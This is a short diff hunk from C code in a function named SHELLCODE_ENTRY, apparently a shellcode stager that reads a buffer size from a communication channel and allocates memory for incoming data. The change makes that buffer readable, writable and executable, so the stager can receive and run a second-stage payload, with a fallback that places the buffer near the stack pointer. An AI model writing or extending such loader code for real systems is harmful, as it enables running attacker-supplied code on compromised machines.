@@ -26,7 +26,7 @@ SHELLCODE_ENTRY {
     /* Read the size of the input buffer (2 bytes). */
     channel_recv(chan, &buffer_size, sizeof(buffer_size));
     if ( MEMORY == MMAP )
-        memory = (unsigned char *) _malloc(buffer_size);
+        memory = (unsigned char *) allocate_memory(buffer_size, PROT_READ|PROT_WRITE|PROT_EXEC);
     else
         memory = get_sp() + 0x100;
 
